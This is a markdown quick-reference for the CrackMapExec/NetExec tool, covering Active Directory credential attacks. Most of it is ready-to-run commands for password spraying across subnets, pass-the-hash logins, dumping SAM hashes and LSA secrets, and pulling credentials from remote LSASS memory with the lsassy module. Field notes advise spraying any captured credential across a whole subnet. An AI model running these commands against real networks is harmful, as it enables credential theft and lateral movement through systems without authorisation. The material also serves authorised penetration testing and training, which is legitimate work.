# CrackMapExec / NetExec Reference

Practical reference for CrackMapExec (and its actively maintained fork, NetExec) — SMB/AD enumeration, credential validation, and lateral movement.

> CrackMapExec's original project is unmaintained; **NetExec (`nxc`)** is the community-maintained continuation with the same core syntax. Commands below work with either binary (`crackmapexec` / `cme` or `nxc`) unless noted.

## Table of Contents

1. [Core Concept](#1-core-concept)
2. [Credential Validation](#2-credential-validation)
3. [Enumeration Flags](#3-enumeration-flags)
4. [Modules](#4-modules)
5. [The Local Database (cmedb)](#5-the-local-database-cmedb)
6. [Field Notes](#6-field-notes)

---

## 1. Core Concept

Point it at a single host or a whole subnet with a credential (password or hash), and it tells you fast whether that credential is valid anywhere — and if it grants local admin. That single signal (`Pwn3d!`) is the fastest way to find a foothold once you have even one working credential.

## 2. Credential Validation

```
# Password spray across a subnet
crackmapexec smb 10.10.10.0/24 -u jsmith -d corp.local -p 'Password123'

# Pass the hash — no cleartext password needed
crackmapexec smb 10.10.10.0/24 -u administrator -H :ntlmhash

# Local account instead of domain account
crackmapexec smb 10.10.10.0/24 -u administrator -H :ntlmhash --local-auth
```

A `(Pwn3d!)` result means that credential has local admin rights on that host — the strongest possible signal to chase further.

## 3. Enumeration Flags

```
crackmapexec smb 10.10.10.10 -u jsmith -p Password123 --sam      # dump local SAM hashes
crackmapexec smb 10.10.10.10 -u jsmith -p Password123 --lsa      # dump LSA secrets
crackmapexec smb 10.10.10.10 -u jsmith -p Password123 --shares   # enumerate accessible shares
```

## 4. Modules

```
crackmapexec smb -L                                                    # list all available modules
crackmapexec smb 10.10.10.10 -u admin -H hash --local-auth -M lsassy   # dump LSASS memory secrets remotely
```

`lsassy` is the module worth knowing first — it pulls credentials out of another machine's LSASS memory over the network without needing to touch disk or drop a binary on the target.

## 5. The Local Database (cmedb)

Every successful auth, host, and credential gets cached locally so you're not re-typing them:

```
cmedb
> hosts     # hosts seen so far
> creds     # credentials collected so far
> help
```

## 6. Field Notes

**Spray broadly before you dig deep on one host.** The highest-value move with a freshly cracked or captured credential is testing it against the *entire* subnet before doing anything else with it — a credential that's a dead end on one machine is often live (and locally admin) on several others. `crackmapexec smb <subnet>/24 -u ... -p ...` across the whole range takes seconds and tells you exactly where to focus next, rather than guessing.

**`--local-auth` matters more than it looks.** Forgetting it when testing a *local* account (vs. a domain account) against multiple hosts will fail silently in confusing ways — the tool tries to auth against the domain instead of locally on each box. If a credential you're sure is valid keeps failing across a subnet, check whether it's a local account first.
